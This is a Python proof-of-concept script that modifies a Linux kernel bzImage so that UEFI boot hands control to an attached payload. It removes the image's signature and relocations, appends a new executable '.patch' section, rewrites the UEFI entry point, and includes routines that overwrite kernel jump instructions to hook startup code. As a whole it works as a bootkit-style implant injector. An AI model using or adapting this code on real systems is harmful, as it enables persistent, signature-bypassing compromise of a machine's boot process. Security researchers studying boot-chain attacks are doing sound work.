"""
PoC to patch a bzImage, only for uefi as we are hooking the the uefi functions
and rely on being able to create more sections.
"""
import sys
import math
import struct
import pefile
from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KS_OPT_SYNTAX_ATT
from binsearch import FixedBytes, BinSearch
from pe import PERemoveSig, PECheckSumFix
from remove_reloc import remove_reloc
from badlink import BadLink

# entrypoints in our code.
BIOS_START = 0
UEFI_START = 32

PAGE_SIZE = 4096


def assemble(code):
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    ks.syntax = KS_OPT_SYNTAX_ATT
    encoding, count = ks.asm(code)
    return bytes(encoding)


def pad_size(dlen, padding=PAGE_SIZE):
    extra = padding - (dlen % padding)
    return dlen + extra


def pad(data, padding=PAGE_SIZE, before=False, value=b'\x00'):
    extra = padding - (len(data) % padding)

    if before:
        return extra * value + data

    return data + extra * value


def to_page_count(value, page_size=PAGE_SIZE):
    return math.ceil(value / page_size)


def uefi_patch(pe_data, offset):
    # Replacing a jump, trashing some error handling code that shouldn't really
    # happen.

    # mov rsi, rbx
    # add rax, rcx
    # jmp rax
    bs = BinSearch([
        FixedBytes(b'\x48\x89\xDE'),
        FixedBytes(b'\x48\x01\xC8'),
        FixedBytes(b'\xFF\xE0')
    ])
    total = 3 + 3 + 2
    matches = bs.search(pe_data)

    assert(len(matches) == 1)

    target_jump_offset = matches[0][0]
    dist = offset - (target_jump_offset + total - 5)
    dist += UEFI_START
    # note: we need to do the instructions we replaced in the next stage!!!
    transfer = pad(
        assemble(f'jmp {hex(dist)}'),
        total, before=True, value=b'\x90'
    )
    pe_data[target_jump_offset:target_jump_offset+total] = transfer
    return pe_data


def dev_patch(pe_data, offset):
    bs = BinSearch([
        FixedBytes(b"\x48\x83\xE4\xF0\x48\x89\xD3"),
    ])
    total = 4 + 3
    matches = bs.search(pe_data)

    assert(len(matches) == 1)
    print(matches)

    target_jump_offset = matches[0][0]
    dist = offset - (target_jump_offset + total - 5)
    dist += UEFI_START
    print('d', dist)
    # note: we need to do the instructions we replaced in the next stage!!!
    transfer = pad(
        assemble(f'self: jmp self'),
        total, before=True, value=b'\x90'
    )
    pe_data[target_jump_offset:target_jump_offset+total] = transfer
    return pe_data


def bios_patch(pe_data, offset, text_offset=0x5000):
    # Patching for BIOS
    # targetting the end of startup_64, in Lrelocated
    # have to match on two sequences, on for newer kernels and one for older as
    # there has been some changes in what is otherwise a pretty stable part of
    # the kernel tree.
    # for the post 6.6 we overwrite some instructions that get used for error
    # handling, which on correctly booted systems isn't an issue.
    # pre 6.6, should be clean, just overwriting a large nop instruction used
    # for padding and the jmp to rax.

    patterns = [
        # post 6.6
        {
            'total': 2 + 9,
            'offset': 3,
            'pattern': [
                FixedBytes(b'\x4c\x89\xfe'),
                FixedBytes(b'\xff\xe0'),
                FixedBytes(b'\xf4\xeb\xfd\x66\x0f\x1f\x44\x00\x00')
            ]
        },
        # pre 6.6
        {
            'total': 2 + 7,
            'offset': 1,
            'pattern': [
                FixedBytes(b'\x5e'),
                FixedBytes(b'\xff\xe0'),
                FixedBytes(b'\x0f\x1f\x80\x00\x00\x00\x00')
            ]
        }
    ]

    match_offset = 0
    total = 0
    matches = []

    for pattern in patterns:
        bs = BinSearch(pattern['pattern'])
        match_offset = pattern['offset']
        total = pattern['total']
        matches = bs.search(pe_data)

        if len(matches) == 1:
            break

    if len(matches) != 1:
        raise Exception('pattern matching bios sequence failed!')

    # Our takeover code.
    # 0x5000 is the start of .text
    print(text_offset)
    target_addr = 0x100_000 + offset + BIOS_START - text_offset

    # Jumping to an exact address
    to_patch_in = f"""
        pushq ${hex(target_addr)}
        ret
    """

    patch = assemble(to_patch_in)
    assert(len(patch) < total)

    # we'll be jumping back down to an old mapping at a fixed address.
    start = matches[0][0] + match_offset
    end = matches[0][0] + total + match_offset
    pe_data[start:end] = pad(
        patch,
        total, before=True, value=b'\x90'
    )

    return pe_data


def add_data(pe_data_orig, data):
    """
    Add a new section to store our patch in the PE, then append our data, and
    install the patches to transfer control to our payload.
    """
    bl = BadLink(data)
    # We can fetch the real entrypoints like this:
    # UEFI_START = bl.get_key(b'uefi_e\x00')
    # BIOS_START = bl.get_key(b'bios_e\x00')

    to_add_size = pad_size(bl.size(), PAGE_SIZE)

    pe = pefile.PE(data=pe_data_orig)

    # Make the last sections raw size equal to its virtual size
    curr_virtual_size = pe.sections[-1].Misc_VirtualSize
    pe.sections[-1].SizeOfRawData += PAGE_SIZE * 2
    curr_real_size = pe.sections[-1].SizeOfRawData

    assert(curr_real_size <= curr_virtual_size)

    # Need some offsets for patching
    last_offset = pe.sections[-1].__file_offset__ + 0x28

    text_offset = 0
    text_start = 0
    for section in pe.sections:
        if section.Name != b'.text\x00\x00\x00':
            continue

        text_offset = section.__file_offset__
        text_start = section.PointerToRawData
        break

    # Now we update the headers
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage += to_add_size
    pe.OPTIONAL_HEADER.SizeOfCode = pe.OPTIONAL_HEADER.SizeOfImage
    old_entrypoint = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    pe_data = bytearray(pe.write())

    # Pad the last section with nulls so our code doesn't get trashed.
    pe_data += b'\x00' * (PAGE_SIZE * 2)
    to_pad_with = curr_virtual_size - curr_real_size

    # Calculate things before appending our data
    offset = len(pe_data)
    uefi_offset = to_pad_with + offset

    # Replacing the UEFI entrypoint
    new_entrypoint = uefi_offset + bl.get_key(b'uefi_e\x00')
    pe = pefile.PE(data=pe_data)
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_entrypoint
    pe_data = bytearray(pe.write())

    called_from = uefi_offset + bl.get_key_offset(b'uefi_o\x00') + 4
    orig_entrypoint = old_entrypoint - called_from

    # need to calculate an offset to use to call the old entrypoint
    bl.set_key(b'uefi_o\x00', struct.pack('<i', orig_entrypoint))

    # Finally, append our data.
    to_add = pad(bl.get(), PAGE_SIZE)
    pe_data += to_add

    # Create new section based on .text, with the same permissions.
    pe_data[last_offset:last_offset + 0x28] = \
        pe_data[text_offset:text_offset + 0x28]

    # Need to use offsets here to work around library issues.

    # name
    pe_data[last_offset:last_offset + 8] = b'.patch\x00\x00'

    # virtualSize
    pe_data[last_offset + 8:last_offset + 8 + 4] = \
        struct.pack('<I', len(to_add))
    # rva
    pe_data[last_offset + 12:last_offset + 12 + 4] = \
        struct.pack('<I', uefi_offset)
    # size of raw data
    pe_data[last_offset + 16:last_offset + 16 + 4] = \
        struct.pack('<I', len(to_add))
    # ptr raw data
    pe_data[last_offset + 20:last_offset + 20 + 4] = \
        struct.pack('<I', offset)

    # Now we want to disable relocation so the kernel is always at its prefered
    # address with various bootloaders.
    pe_data[0x234] = 0
    # And fix the prefered address.
    pe_data[0x258:0x258 + 8] = struct.pack('<Q', 0x100_000)
    # make the alignment and init_size really high
    # pe_data[0x230:0x230 + 4] = struct.pack('<I', 0xf0_00_00_00)
    # pe_data[0x260:0x260 + 4] = struct.pack('<I', 0xff_ff_ff_ff)
    # pe_data[0x214:0x214+4] = struct.pack('<I', 0xf0_f0_f0_f0)

    # Our UEFI Patch to transfer control
    # pe_data = uefi_patch(pe_data, uefi_offset)
    # Our BIOS Patch to transfer control
    # pe_data = bios_patch(pe_data, offset, text_start)

    print(offset)

    return pe_data


def main():
    a = open(sys.argv[1], 'rb').read()

    # remove the sig
    a = PERemoveSig(a).remove_sig()

    # Remove the reloc section in older kernels
    a = remove_reloc(a)

    # Adding our payload
    # this is the first stage that will patch the kernel after its been
    # decompressed, hooking an initcall and making sure our payload exists in
    # virtual memory.
    payload = open('./payload/all.bin', 'rb').read()
    a = add_data(
        a,
        pad(payload, value=b'\x00')
    )

    # Checksum fixes for sanity
    # need to fix the bzImage checksum. Nothing really checks it, but lets do
    # it for completenes.
    last = PECheckSumFix(a).fix()
    open(sys.argv[2], 'wb').write(last)


if __name__ == "__main__":
    main()
